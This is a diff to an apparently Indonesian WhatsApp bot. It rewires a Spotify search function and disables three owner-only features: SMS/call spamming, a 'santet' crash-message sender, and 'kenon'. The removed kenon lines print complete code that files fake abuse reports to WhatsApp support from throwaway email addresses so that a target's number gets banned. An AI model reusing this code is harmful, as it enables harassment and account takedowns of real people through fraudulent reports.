@@ -1871,22 +1871,23 @@ During ${clockString(new Date - user.afkTime)}
 
     async function searchSpotify(query) {
       try {
-        const access_token = await getAccessToken();
-        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
-          headers: {
-            Authorization: `Bearer ${access_token}`,
-          },
-        });
-        const data = response.data;
-        const tracks = data.tracks.items.map(item => ({
-          name: item.name,
-          artists: item.artists.map(artist => artist.name).join(', '),
-          popularity: item.popularity,
-          link: item.external_urls.spotify,
-          image: item.album.images[0].url,
-          duration_ms: item.duration_ms,
-        }));
-        return tracks;
+        const response = await Api.neoxr('/spotifySearch', {
+          q: query
+        })
+        if (!response.status || !Array.isArray(response.data)) {
+          throw new Error(response.message || response.msg || 'Spotify search failed')
+        }
+        return response.data
+          .filter(item => item && item.url)
+          .map(item => ({
+            name: item.title || '-',
+            artists: item.title && item.title.includes(' - ') ? item.title.split(' - ')[0] : '-',
+            popularity: item.popularity || '-',
+            link: item.url,
+            image: item.thumbnail || '',
+            duration_ms: item.duration || '-',
+            preview: item.preview || null
+          }))
       } catch (error) {
         console.error('Error searching Spotify:', error);
         throw 'An error occurred while searching for songs on Spotify.';
@@ -13701,6 +13702,8 @@ Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui 
         break
       //=================================================
       case 'spamsms': {
+        reply(`‼️*[MAINTENANCE FEATURES]*\nCreated by: *ChanDev*\n\n` + "Ups Fitur Ini Sedang Dalam Perbaikan")
+        /*
         if (!DanzTheCreator) return reply(mess.only.owner)
         const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
         if (m.quoted || text) {
@@ -13726,113 +13729,19 @@ Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui 
             });
           }
         } else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
-        m.reply(`spam sms/call akan di kirim ke no target`)
+        m.reply(`spam sms/call akan di kirim ke no target`)*/
       }
         break
       //================================================\\
       case 'kenon': {
-        if (!DanzTheCreator) return reply(mess.only.owner)
-        if (m.quoted || q) {
-          var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-          if (tosend === owner) return replynano(`Tidak bisa verif My Creator!`)
-          var targetnya = tosend.split('@')[0]
-
-          try {
-            var axioss = require('axios')
-            let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-            let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-            let cookie = ntah.headers["set-cookie"].join("; ")
-            const cheerio = require('cheerio');
-            let $ = cheerio.load(ntah.data)
-            let $form = $("form");
-            let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-            let form = new URLSearchParams()
-            form.append("jazoest", $form.find("input[name=jazoest]").val())
-            form.append("lsd", $form.find("input[name=lsd]").val())
-            form.append("step", "submit")
-            form.append("country_selector", "+")
-            form.append("phone_number", `+${targetnya}`,)
-            form.append("email", email.data[0])
-            form.append("email_confirm", email.data[0])
-            form.append("platform", "ANDROID")
-            form.append("your_message", ` Saya perhatikan ada pengguna yang menggunakan whatsapp yang dimodifikasi, jadi saya meminta dukungan untuk memblokir akun ini karena melanggar persyaratan layanan, dan akun tersebut menggunakan bot WhatsApp yang dapat mengirim pesan jahat sehingga WhatsApp pengguna lain tidak dapat berfungsi.
-Nomor : +${targetnya}`)
-            form.append("__user", "0")
-            form.append("__a", "1")
-            form.append("__csr", "")
-            form.append("__req", "8")
-            form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
-            form.append("dpr", "1")
-            form.append("__ccg", "UNKNOWN")
-            form.append("__rev", "1007735016")
-            form.append("__comment_req", "0")
-
-            let res = await axioss({
-              url,
-              method: "POST",
-              data: form,
-              headers: {
-                cookie
-              }
-
-            })
-            replynano(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
-            let payload = String(res.data)
-            if (payload.includes(`"payload":true`)) {
-              replynano(`##- WhatsApp Support -##
-
-Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.
-
-Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download
-
-Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.
-
-Berikut yang mungkin terjadi jika Anda menggunakannya:
-
-Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.
-
-Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.
-
-Berikut adalah ketentuan layanan WhatsApp:
-
-Ketentuan Layanan WhatsApp
-
-1. Penggunaan Aplikasi
-
-Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.
-
-2. Hak Cipta dan Merek Dagang
-
-Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.
-
-3. Privasi dan Keamanan Data
-WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 
-
-4. Pembatasan Tanggung Jawab 
-WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 
-
-5. Perubahan Ketentuan Layanan 
-WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
-            } else if (payload.includes(`"payload":false`)) {
-              replynano(`##- WhatsApp Support -##
-
-Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
-            } else replynano(util.format(res.data))
-          } catch (err) { replynano(`${err}`) }
-        } else replynano('Masukkan nomor target!')
+        reply(`‼️*[MAINTENANCE FEATURES]*\nCreated by: *ChanDev*\n\n` + "Ups Fitur Ini Sedang Dalam Perbaikan")
       }
-        break
-
+      break
       //=================={{=[===================]]\\
 
       case 'santet': case '🌷': case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
-        if (!DanzTheCreator) return reply(mess.only.owner)
-        const { xeonorwot } = require('./virtex/xeonbut2')
-        let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-        NanoBotz.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
+        reply(`‼️*[MAINTENANCE FEATURES]*\nCreated by: *ChanDev*\n\n` + "Ups Fitur Ini Sedang Dalam Perbaikan")
       }
-        break
-
       //=================={{=[===================]]\\
       case 'tourl': {
         if (!quoted) return replynano(`mana fotonya kak?`)
